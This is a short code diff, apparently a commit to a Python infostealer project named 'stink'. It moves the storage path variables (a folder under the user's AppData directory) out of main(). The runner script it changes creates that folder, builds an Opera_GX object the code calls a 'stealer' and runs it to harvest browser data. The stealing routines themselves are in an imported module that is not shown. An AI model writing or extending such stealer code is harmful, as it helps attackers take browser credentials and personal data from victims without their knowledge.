@@ -48,18 +48,18 @@ from os import path, mkdir
 from stink.browsers.opera_gx import Opera_GX
 from getpass import getuser
 
+storage_path = f"C:/Users/{getuser()}/AppData/"
+storage_folder = "files/"
+
 
 def main():
-    
-    storage_path = f"C:/Users/{getuser()}/AppData/"
-    storage_folder = "files/"
-    
+
     if not path.exists(storage_path + storage_folder):
         mkdir(storage_path + storage_folder)
 
     stealer = Opera_GX(storage_path=storage_path, storage_folder=storage_folder)
     stealer.run()
-    
+
 
 if __name__ == "__main__":
     main()
